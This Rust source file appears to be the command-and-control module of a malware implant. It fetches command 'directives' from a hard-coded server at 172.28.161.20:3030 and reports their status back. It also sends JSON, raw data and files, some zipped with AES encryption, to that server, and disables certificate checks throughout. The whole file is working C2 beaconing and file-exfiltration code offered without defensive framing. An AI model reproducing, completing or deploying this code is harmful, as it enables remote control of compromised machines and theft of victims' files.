use anyhow::Result;
use reqwest::Client;
use reqwest::Error;
use serde::Deserialize;
use serde::Serialize;
use std::fs::File;
use std::io::prelude::*;
use std::io::Read;
use std::path::Path;
use tempfile::NamedTempFile;
use zip::result::ZipResult;
use zip::write::SimpleFileOptions;
use zip::{AesMode, CompressionMethod};

enum _Status {
    SUCCESSFUL,
    FAILED,
}
#[derive(Deserialize)]
struct Directive {
    // id: String,
    command: String,
    // status: String,
}

pub async fn send_directive_status(
    directive: &str,
    status: &str,
    message: &str,
) -> Result<(), reqwest::Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let body = serde_json::json!({
        "directive": directive,
        "status": status,
        "message": message
    });

    let res = client
        .post("https://172.28.161.20:3030/sync")
        .json(&body)
        .send()
        .await;

    if let Err(e) = res {
        eprintln!("Erreur lors de l'envoi du statut : {:?}", e);
    }

    Ok(())
}

pub async fn get_directives() -> Result<Vec<String>, Error> {
    let url = "https://172.28.161.20:3030/directives";

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client.get(url).send().await?.error_for_status()?;

    let directives: Vec<Directive> = response.json().await?;

    let commands: Vec<String> = directives
        .into_iter()
        .map(|directive| directive.command)
        .collect();

    Ok(commands)
}

pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://172.28.161.20:3030/directives")
        .header("Content-Type", "application/json")
        .json(data)
        .send()
        .await?;

    Ok(())
}

pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://172.28.161.20:3030/directives")
        .body(data)
        .send()
        .await?;

    Ok(())
}

pub async fn zip_file(filename: &Path) -> ZipResult<NamedTempFile> {
    let mut tmp_archive = NamedTempFile::new()?;
    {
        let mut zip = zip::ZipWriter::new(&mut tmp_archive);

        let mut file = File::open(filename)?;
        let mut buff = Vec::new();
        file.read_to_end(&mut buff)?;

        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, "password");

        let archive_name = filename.file_name().unwrap_or_default().to_string_lossy();

        zip.start_file(archive_name, options)?;
        zip.write_all(&buff)?;
        zip.finish()?;
    }

    Ok(tmp_archive)
}

pub async fn send_zip_to_c2(filepath: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let file_bytes = tokio::fs::read(filepath).await?;

    let response = client
        .post("https://172.28.161.20:3030/directives")
        .header("Content-Type", "application/zip")
        .body(file_bytes)
        .send()
        .await?;

    println!("Status: {}", response.status());
    Ok(())
}
